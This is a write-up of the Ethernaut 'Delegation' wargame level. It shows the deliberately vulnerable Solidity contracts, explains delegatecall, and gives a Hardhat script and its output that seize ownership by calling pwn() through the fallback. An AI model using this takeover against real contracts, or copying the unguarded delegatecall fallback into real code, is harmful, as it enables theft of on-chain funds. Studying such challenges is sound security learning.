---
title: Ethernaut \#06 Delegation
tags: [ethernaut]
style: border
color: primary
description: Ethernaut Delegation challenge writeup
---

## Delegation

### Challenge

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

* Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
* Fallback methods
* Method ids


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

### Background

The low level instruction `delegatecall` will execute the code in some other contract under the context of the current contract. This means the the code being called is executed but with the storage, `msg.value`, `msg.sender` etc of the caller contract. This can be used to implement libraries and and proxy contracts used for upgradeability.

### Attack

The attack is simple, we can call the `Delegation` contract address using the ABI of the `Delegate` contract. Is this case, the `fallback` function of the `Delegation` contract will be called and delegate the execution to the `Delegate` contract. Then we simply need to call the `pwn` function which will update the first slot in the caller function to the `msg.sender`, which in this case is the attacker.

* Get instance of `Delegate` contract ABI with `Delegation` contract address
* Call `pwn` function

#### token-solve.js

```javascript
const hre = require("hardhat");
const { ethers, upgrades } = require("hardhat");

async function main() {
    delegationAddress = "0x65fE1306C4fFF667D9f0A75dc4226289Ec1e62e3";
    contract = await ethers.getContractAt("Delegate", delegationAddress);

    const accounts = await hre.ethers.getSigners();
    account = accounts[0];

    console.log("Level address   : " + contract.address)
    console.log("Contract Owner  : " + await contract.owner())

    // call delegate contract function
    tx = await contract.connect(account).pwn()
    receipt = await tx.wait()

    console.log("Contract Owner  : " + await contract.owner())
    
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

```bash
$ npx hardhat run scripts/delegation-solve.js --network rinkeby
Level address   : 0x65fE1306C4fFF667D9f0A75dc4226289Ec1e62e3
Contract Owner  : 0x9451961b7Aea1Df57bc20CC68D72f662241b5493
Contract Owner  : 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
```

### Success Message

Usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The `delegatecall` function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) article for an accurate explanation of how this idea was used to steal 30M USD.
